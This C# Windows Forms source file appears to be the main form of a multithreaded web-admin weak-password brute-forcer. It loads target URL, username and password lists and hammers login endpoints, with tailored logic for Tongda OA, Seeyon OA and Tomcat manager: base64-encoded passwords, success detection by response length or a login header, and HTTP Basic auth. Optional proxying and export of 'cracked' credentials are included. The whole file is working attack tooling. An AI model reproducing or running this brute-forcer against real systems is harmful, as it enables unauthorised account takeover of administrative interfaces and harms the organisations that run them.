using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Linq;


namespace ADS_Web后台弱口令扫描
{
    public partial class Form1 : Form
    {
        public static int Thread_num = 100;//初始线程数
        public static string Urls_path;
        public static string User_path;
        public static string Pass_path;
        public static string User_field;
        public static string Pass_field;
        public static string New_post_url = "";
        public static string Proxy_server = null;
        public static string Proxy_port = null;
        public static long Content_L = 0;//重置响应包长度
        public static int suc_num = 0;//成功数置零
        public static string OA_Selected;
        public static List<string> Url = new List<string>() { };
        public static Form1 m_form1;//将本窗体设为静态，供其他窗体调用方法

        public Form1()
        {
            InitializeComponent();
            m_form1 = this;

        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //窗体加载事件
            comboBox1.SelectedIndex = 0;//类型默认选第一个
            comboBox2.SelectedIndex = 0;
            toolStripStatusLabel2.Text = "暂未开始";
            toolStripStatusLabel4.Text = "暂无结果";
        }


        /*判断登录接口是否变化*/
        public static bool GetPostUrl(string post_url, int Timeout)
        {
            string Host = post_url;

            int firstIndex;
            string pre_url;
            //目标类型选择
            switch (OA_Selected)
            {
                case "通达OA":
                    post_url = post_url + "/logincheck.php";
                    New_post_url = post_url;
                    return true;
                case "致远OA":
                    post_url = Host + "/seeyon/main.do?method=login";
                    New_post_url = post_url;
                    return true;
                case "tomcat":
                    post_url = Host + "/manager/html";
                    New_post_url = post_url;
                    return true;
                default:
                    firstIndex = post_url.LastIndexOf("/");
                    pre_url = post_url.Substring(0, firstIndex);
                    post_url = pre_url + "/login";
                    //对目标URL发送GET请求，判断目标是否存活
                    HttpWebRequest Req_HEAD = (HttpWebRequest)WebRequest.Create(post_url);
                    if (Proxy_server != null && Proxy_port != null)
                    {
                        var proxy = new WebProxy(Proxy_server + ":" + Proxy_port, true);
                        Req_HEAD.Proxy = proxy;
                    }
                    Req_HEAD.Method = "GET";
                    Req_HEAD.AllowAutoRedirect = false;
                    Req_HEAD.ContentType = "text/html;charset=UTF-8";
                    Req_HEAD.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
                    Req_HEAD.Timeout = Timeout;
                    try
                    {
                        HttpWebResponse Rep_HEAD = (HttpWebResponse)Req_HEAD.GetResponse();
                        int ret_HEAD = (int)Rep_HEAD.StatusCode;
                        //如果不能访问，就立即停止本线程，返回 False
                        if (ret_HEAD == 200)
                        {
                            New_post_url = post_url;
                            return true;
                        }
                        else
                        {
                            return false;//登录接口没有换URL
                        }
                    }
                    catch (Exception)//捕获异常，然后退出
                    {
                        return false;
                    }
            }

            
        }


        //判断某个字符串是否存在于txt文件（给委托写日志用的）
        private bool IsExistStr(string strError)
        {
            bool isExist = false;
            int nLength = strError.Length;
            StreamReader sr = new StreamReader("./error_log.txt");
            string strLine = sr.ReadToEnd();

            if (strLine.Length >= nLength)
            {
                for (int i = 0; i < strLine.Length - nLength; i++)
                {
                    if (strLine.Substring(i, nLength) == strError)
                    {
                        isExist = true;
                        break;
                    }
                }
            }
            else
            {
                isExist = false;
            }
            sr.Close();
            return isExist;
        }





        //写错误日志的委托和方法
        public delegate void LogAdd(string message);//定义委托
        private void Error_log(string message)
        {
            //写文件，传message
            if (!IsExistStr(message))//如这个消息不存在才写入
            {
                FileStream fs = new FileStream("./error_log.txt", FileMode.Append);
                StreamWriter sw = new StreamWriter(fs);
                sw.WriteLine(message);
                sw.Flush();//清空缓冲区
                sw.Close();//关闭流
                fs.Close();
            }
        }

        /*
         *用于添加成功结果的委托线程
         */
        public delegate void SucRsAdd(string url, string username, string password);//定义委托
        
        private void SucAdd(string url, string username, string password)
        {
            listBox1.Items.Add(url + "   " + username + "   " + password);
            toolStripStatusLabel4.Text = suc_num.ToString();//成功数增加
            //listBox1.Items.Add(url + "   " + username + "   " + password);  这样直接操作是错误的，线程间（跨线程）操作无效
        }

        private void FailAdd(string url, string username, string password)
        {
            toolStripStatusLabel2.Text = url + "   " + username + "   " + password;//状态栏中正在破解的目标
            //Application.DoEvents();//窗口控件重绘，用了委托就不用这个了
        }

        /*选中效果委托*/
        public delegate void SELECTED(string url);

        private void SELECT(string url)
        {
            listBox2.SelectedItem = url;
        }


        /*
         * 获取Cookie
         */
        public string GetCookie(string url, string username, string password)
        {
            string cookie=null;
            String postData = User_field + "=" + username + "&" + Pass_field + "=" + password;
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.AllowAutoRedirect = false;//服务端重定向，一般设置false
            req.ContentType = "application/x-www-form-urlencoded";//数据一般设置这个值，除非是文件上传
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            req.ContentLength = postBytes.Length;
            req.Timeout = 18000;
            Stream postDataStream = req.GetRequestStream();
            postDataStream.Write(postBytes, 0, postBytes.Length);
            postDataStream.Close();
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            cookie = resp.Headers.Get("Set-Cookie");//获取登录后的cookie值。
            if (cookie != null)
            {
                return cookie;
            }
            else
            {
                //改成日志
                return "没获取到Cookie";
            }
        }
        

        /* 
         * 这个就是子线程，即被调用的爆破功能函数
         */
        public void Brute(string url,string username,string password,long error_content)
        {
            //列表框选中状态
            SELECTED SE = new SELECTED(SELECT);
            this.BeginInvoke(SE, new object[] { url });

            ServicePointManager.DefaultConnectionLimit = 1024;//设置http并发数限制
            SucRsAdd Suc_add = new SucRsAdd(SucAdd);//声明添加成功结果的委托变量,并赋值
            try
            {
                //匹配登录接口，改变URL
                if (GetPostUrl(url, 10000))
                {
                    url = New_post_url;
                }

                String postData;
                string cookie;
                //目标类型选择，处理数据的方式不通，比如通达的密码要base64编码
                switch (OA_Selected)
                {
                    case "通达OA":
                        byte[] tmp = Encoding.Default.GetBytes(password);
                        password = Convert.ToBase64String(tmp);
                        postData = User_field + "=" + username + "&" + Pass_field + "=" + password + "&encode_type=1";
                        cookie = GetCookie(url, username, password);
                        break;
                    case "tomcat":
                        byte[] ttmp = Encoding.Default.GetBytes(username + ":" + password);
                        postData = Convert.ToBase64String(ttmp);
                        cookie = null;
                        break;
                    default:
                        password = password;
                        postData = User_field + "=" + username + "&" + Pass_field + "=" + password;
                        cookie = GetCookie(url, username, password);
                        break;

                }

                SucRsAdd FA = new SucRsAdd(FailAdd);//更新任务进度
                listBox1.BeginInvoke(FA, new object[] { url, username, password });

                HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口
                if (Proxy_server != null && Proxy_port != null)
                {
                    var proxy = new WebProxy(Proxy_server + ":" + Proxy_port, true);
                    reqContent.Proxy = proxy;
                }
                HttpWebResponse respContent;
                switch (OA_Selected)
                {
                    case "tomcat":
                        try
                        {
                            reqContent.Method = "GET";
                            reqContent.ContentType = "text/html;charset=UTF-8";
                            reqContent.Headers.Add("Authorization", "Basic " + postData);
                            reqContent.AllowAutoRedirect = false;//不自动跟随服务端重定向
                            reqContent.Timeout = 18000;
                            respContent = (HttpWebResponse)reqContent.GetResponse();
                            listBox1.BeginInvoke(Suc_add, new object[] { url, username, password });
                            break;
                        }
                        catch (Exception exx)
                        {
                            string message = "目标" + url + "出现错误： " + exx.ToString();
                            LogAdd ld = new LogAdd(Error_log);
                            this.BeginInvoke(ld, new object[] { message });
                            break;
                        }
                    default:
                        reqContent.Method = "POST";
                        reqContent.ContentType = "application/x-www-form-urlencoded";//数据一般设置这个值，除非是文件上传
                        reqContent.AllowAutoRedirect = false;//不自动跟随服务端重定向
                        byte[] postBytes = Encoding.UTF8.GetBytes(postData);
                        reqContent.ContentLength = postBytes.Length;
                        reqContent.Timeout = 15000;
                        reqContent.Headers.Add("Cookie", cookie);//带Cookie请求
                        Stream postDataStream = reqContent.GetRequestStream();
                        postDataStream.Write(postBytes, 0, postBytes.Length);
                        postDataStream.Close();
                        respContent = (HttpWebResponse)reqContent.GetResponse();
                        var LoginError = "1";
                        if (OA_Selected == "致远OA")
                        {
                            LoginError = respContent.Headers.GetValues("LoginError").First();
                        }
                        else
                        {
                            LoginError = "1";
                        }
                        //用来正确的获取响应包长度
                        MemoryStream stmMemory = new MemoryStream();
                        Stream stream = respContent.GetResponseStream();
                        byte[] arraryByte = new byte[1024];
                        byte[] buffer1 = new byte[1024 * 100];  //每次从文件读取1024个字节。
                        int i;
                        //将字节逐个放入到Byte 中
                        while ((i = stream.Read(buffer1, 0, buffer1.Length)) > 0)
                        {
                            stmMemory.Write(buffer1, 0, i);
                        }
                        arraryByte = stmMemory.ToArray();
                        stmMemory.Close();
                        Content_L = error_content;//错误密码的返回长度

                        //不同类型目标有不同的判断成功的方式
                        if (arraryByte.Length == 1666)//通达密码正确的返回内容长度是1666
                        {
                            suc_num += 1;
                            password = Encoding.Default.GetString(System.Convert.FromBase64String(password));//把密码解密回来
                            listBox1.BeginInvoke(Suc_add, new object[] { url, username, password });//跨线程调用委托添加成功结果
                        }
                        else if (LoginError == "13")//致远OA只能用IE登录,LoginError: 13就是登陆成功
                        {
                            suc_num += 1;
                            listBox1.BeginInvoke(Suc_add, new object[] { url, username, password });
                        }
                        else if (Content_L != arraryByte.Length)
                        {
                            suc_num += 1;
                            listBox1.BeginInvoke(Suc_add, new object[] { url, username, password });
                        }
                        break;
                }  
            }
            catch (Exception ex)
            {
                string message = "目标"+url+"出现错误： " + ex.ToString();
                LogAdd ld = new LogAdd(Error_log);
                this.BeginInvoke(ld, new object[] { message });
            }

        }

        //获取错误密码的响应包长度
        public long GetErrorContent(string url)
        {
            string password= "errorpass";
            String postData = User_field + "=" + "admin" + "&" + Pass_field + "=" + password;

            //变化表单请求URL
            if (GetPostUrl(url, 15000))
            {
                url = New_post_url;
            }

            HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口
            if (Proxy_server != null && Proxy_port != null)
            {
                var proxy = new WebProxy(Proxy_server + ":" + Proxy_port, true);
                reqContent.Proxy = proxy;
            }
            reqContent.Method = "POST";
            reqContent.AllowAutoRedirect = false;
            reqContent.ContentType = "application/x-www-form-urlencoded";
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            reqContent.ContentLength = postBytes.Length;
            Stream postDataStream = reqContent.GetRequestStream();
            postDataStream.Write(postBytes, 0, postBytes.Length);
            postDataStream.Close();
            HttpWebResponse respContent = (HttpWebResponse)reqContent.GetResponse();

            //用来正确的获取响应包长度
            MemoryStream stmMemory = new MemoryStream();
            Stream stream = respContent.GetResponseStream();
            byte[] arraryByte = new byte[1024];
            byte[] buffer1 = new byte[1024 * 100];  //每次从文件读取1024个字节。
            int i;
            //将字节逐个放入到Byte 中
            while ((i = stream.Read(buffer1, 0, buffer1.Length)) > 0)
            {
                stmMemory.Write(buffer1, 0, i);
            }
            arraryByte = stmMemory.ToArray();
            stmMemory.Close();

            return arraryByte.Length;
        }


        /*
         * 开始爆破++++++++++++++++++
         */
        public void Start()
        {
            try
            {
                if (Url.Count < 1)
                {
                    MessageBox.Show("没有存活目标");
                }
                else
                {
                    ThreadPool.SetMinThreads(2, 1);//设置线程池在新请求预测中维护的空闲线程数
                    ThreadPool.SetMaxThreads(Thread_num, Thread_num);//设置线程池最大线程数，用来控制线程
                    listBox1.Items.Clear();//结果输出框清空
                    suc_num = 0;
                    listBox1.Items.Add("任务开始......");
                    RegisteredWaitHandle rhw = null;//为线监控程池线程结束做准备
                    DateTime start_time = DateTime.Now;

                    if (comboBox2.SelectedIndex != 0)
                    {
                        Thread_num = Convert.ToInt32(comboBox2.SelectedItem);
                    }

                    for (int i = 0; i < Url.Count; i++)
                    {
                        string url = Url[i];

                        listBox2.Items.Add(url);
                        Application.DoEvents();//重绘窗口,添加任务列表

                        long error_content;
                        switch (OA_Selected)
                        {
                            case "tomcat":
                                error_content = 123;
                                break;
                            default:
                                error_content = GetErrorContent(url);
                                break;

                        }
                        StreamReader sr_user = new StreamReader(User_path);//从该文件加载用户字典
                        while (!sr_user.EndOfStream)
                        {
                            string userName = sr_user.ReadLine();//遍历用户名
                            StreamReader sr_pass = new StreamReader(Pass_path);//从该文件加载密码字典
                            while (!sr_pass.EndOfStream)
                            {
                                string userPass = sr_pass.ReadLine();//遍历密码  
                                ThreadPool.QueueUserWorkItem(brtue => Brute(url, userName, userPass, error_content));//线程池，多线程开启任务
                            }
                            sr_pass.Close();
                        }
                        sr_user.Close();
                    }

                    //监测线程池任务是否结束
                    rhw = ThreadPool.RegisterWaitForSingleObject(new AutoResetEvent(false), new WaitOrTimerCallback((obj, b) =>
                    {
                        int workerThreads = 0;
                        int maxWordThreads = 0;

                        int compleThreads = 0;
                        ThreadPool.GetAvailableThreads(out workerThreads, out compleThreads);
                        ThreadPool.GetMaxThreads(out maxWordThreads, out compleThreads);

                        //当可用的线数与池程池最大的线程相等时表示线程池中所有的线程已经完成 
                        if (workerThreads == maxWordThreads)
                        {
                            rhw.Unregister(null);
                            //此处是所有线程完成后的处理代码
                            DateTime end_time = DateTime.Now;
                            var all_time = end_time - start_time;
                            toolStripStatusLabel2.Text = "任务结束,总共成功破解 " + suc_num + " 个目标；共耗时" + all_time;
                            MessageBox.Show("所有任务已经完成");
                            rhw = null;

                        }
                    }), null, 100, false);
                }
            }
            catch (Exception ex)
            {
                string message = "爆破时未知错误（Strat方法中）" + ex.ToString();
                LogAdd ld = new LogAdd(Error_log);
                this.BeginInvoke(ld, new object[] { message });
            }
        }
        private void 开始爆破AccToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listBox2.Items.Clear();
            OA_Selected = comboBox1.SelectedItem.ToString();
            Url_IsOk uok = new Url_IsOk();
            uok.Show();
        }

        private void 导出结果ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //结果另存为
            SaveFileDialog op = new SaveFileDialog();
            op.Title = "结果另存为";
            op.FileName = "brute_success.txt";
            if (op.ShowDialog() == DialogResult.OK)
            {
                FileStream fs = new FileStream(op.FileName, FileMode.Create, FileAccess.Write, FileShare.None);
                fs.Close();
                StreamWriter sw = new StreamWriter(fs.Name);
                for (int i = 0; i < listBox1.Items.Count; i++)
                {
                    sw.WriteLine(listBox1.Items[i]);
                }
                sw.Close();
                MessageBox.Show("结果已导出");

            }
        }

        private void 代理设置ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Proxy pySet = new Proxy();
            pySet.Show();
        }

        //下边一大段都是结果集右键菜单
        private void 在浏览器打开ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                String open_url;
                open_url = this.listBox1.SelectedItem.ToString();
                int firstIndex = open_url.IndexOf("   ");
                open_url = open_url.Substring(0, firstIndex);
                System.Diagnostics.Process.Start(open_url);
            }
            catch (Exception)
            {
                MessageBox.Show("这个网址我打不开，请自行复制到浏览器打开");
            }

        }

        private void 复制本行结果ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetDataObject(this.listBox1.SelectedItem.ToString());
            }
            catch (Exception ex_cp)
            {
                MessageBox.Show("复制出错\n" + ex_cp.ToString());
            }
        }

        private void 清空结果ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
            Url.Clear();
            toolStripStatusLabel2.Text = "暂未开始";
            suc_num = 0;
            toolStripStatusLabel4.Text = suc_num.ToString();
            listBox2.Items.Clear();
            Url.Clear();
        }




        private void button1_Click(object sender, EventArgs e)
        {
            //从文件加载URL
            OpenFileDialog op_url = new OpenFileDialog();
            op_url.Title = "打开目标URL文件";
            op_url.FileName = "*.txt";
            if (op_url.ShowDialog() == DialogResult.OK)
            {
                int line = 0;
                FileInfo fi = new FileInfo(op_url.FileName);
                string urls_path = op_url.FileName;//字典位置，从这读
                Urls_path = urls_path;
                StreamReader sr = fi.OpenText();
                var ls = "";
                while ((ls = sr.ReadLine()) != null)
                {
                    line++;
                }
                textBox1.Text = "已导入 " + line.ToString() + " 个目标";//读取字典数量

                sr.Close();
            }
        }

        private void button_users_Click(object sender, EventArgs e)
        {
            //从文件选择用户名
            OpenFileDialog op_url = new OpenFileDialog();
            op_url.Title = "选择用户名文件";
            op_url.FileName = "*.txt";
            if (op_url.ShowDialog() == DialogResult.OK)
            {
                int line = 0;
                FileInfo fi = new FileInfo(op_url.FileName);
                string urls_path = op_url.FileName;//用户名字典位置，从这读
                User_path = urls_path;
                StreamReader sr = fi.OpenText();
                var ls = "";
                while ((ls = sr.ReadLine()) != null)
                {
                    line++;
                }
                textBox_users.Text = "已导入 " + line.ToString() + " 个用户名";//读取字典数量
                sr.Close();
            }
        }

        private void button_pass_Click(object sender, EventArgs e)
        {
            //从文件选择密码
            OpenFileDialog op = new OpenFileDialog();
            op.Title = "选择密码文件";
            op.FileName = "*.txt";
            if (op.ShowDialog() == DialogResult.OK)
            {
                int line = 0;
                FileInfo fi = new FileInfo(op.FileName);
                string pass_path = op.FileName;//字典位置，从这读
                Pass_path = pass_path;
                StreamReader sr = fi.OpenText();
                var ls = "";
                while ((ls = sr.ReadLine()) != null)
                {
                    line++;
                }
                textBox_pass.Text = "已导入 " + line.ToString() + " 个密码";//读取字典数量
                sr.Close();
            }
        }

        private void 动态字典生成ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            gen_dict Fgd = new gen_dict();
            Fgd.Show();
        }



        private void 导出当前结果ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //结果另存为
            SaveFileDialog op = new SaveFileDialog();
            op.Title = "结果另存为";
            op.FileName = "brute_success.txt";
            if (op.ShowDialog() == DialogResult.OK)
            {
                FileStream fs = new FileStream(op.FileName, FileMode.Create, FileAccess.Write, FileShare.None);
                fs.Close();
                StreamWriter sw = new StreamWriter(fs.Name);
                for (int i = 0; i < listBox1.Items.Count; i++)
                {
                    sw.WriteLine(listBox1.Items[i]);
                }
                sw.Close();
                MessageBox.Show("结果已导出");

            }
        }

        private void listBox2_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();//绘制背景 
            Brush myBrush = new SolidBrush(Color.FromArgb(17, 167, 225));
            Graphics g = e.Graphics;
            //选中时效果
            if((e.State & DrawItemState.Selected) == DrawItemState.Selected)
            {
                myBrush = new SolidBrush(Color.FromArgb(255,250,250));
                g.FillRectangle(new SolidBrush(Color.FromArgb(17,120,215)), e.Bounds);
            }
            e.DrawFocusRectangle();
            //绘制文本 
            e.Graphics.DrawString(listBox2.Items[e.Index].ToString(), e.Font, myBrush, e.Bounds, StringFormat.GenericDefault);
        }

        private void listBox1_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();//绘制背景 
            Brush myBrush = new SolidBrush(Color.FromArgb(17, 167, 225));
            Graphics g = e.Graphics;
            
            //选中时效果
            if ((e.State & DrawItemState.Selected) == DrawItemState.Selected)
            {
                myBrush = new SolidBrush(Color.FromArgb(255, 250, 250));
                g.FillRectangle(new SolidBrush(Color.FromArgb(17, 120, 215)), e.Bounds);
            }
            e.DrawFocusRectangle();
            //绘制文本 
            e.Graphics.DrawString(listBox1.Items[e.Index].ToString(), e.Font, myBrush, e.Bounds, StringFormat.GenericDefault);
        }

        private void comboBox2_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();//绘制背景 
            Brush myBrush = new SolidBrush(Color.FromArgb(17, 167, 225));
            Graphics g = e.Graphics;
            //选中时效果
            if ((e.State & DrawItemState.Selected) == DrawItemState.Selected)
            {
                myBrush = new SolidBrush(Color.FromArgb(255, 250, 250));
                g.FillRectangle(new SolidBrush(Color.FromArgb(17, 120, 215)), e.Bounds);
            }
            e.DrawFocusRectangle();
            //绘制文本 
            e.Graphics.DrawString(comboBox2.Items[e.Index].ToString(), e.Font, myBrush, e.Bounds, StringFormat.GenericDefault);
        }

        private void comboBox1_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.DrawBackground();//绘制背景 
            Brush myBrush = new SolidBrush(Color.FromArgb(17, 167, 225));
            Graphics g = e.Graphics;
            //选中时效果
            if ((e.State & DrawItemState.Selected) == DrawItemState.Selected)
            {
                myBrush = new SolidBrush(Color.FromArgb(255, 250, 250));
                g.FillRectangle(new SolidBrush(Color.FromArgb(17, 120, 215)), e.Bounds);
            }
            e.DrawFocusRectangle();
            //绘制文本 
            e.Graphics.DrawString(comboBox1.Items[e.Index].ToString(), e.Font, myBrush, e.Bounds, StringFormat.GenericDefault);
        }
    }
}
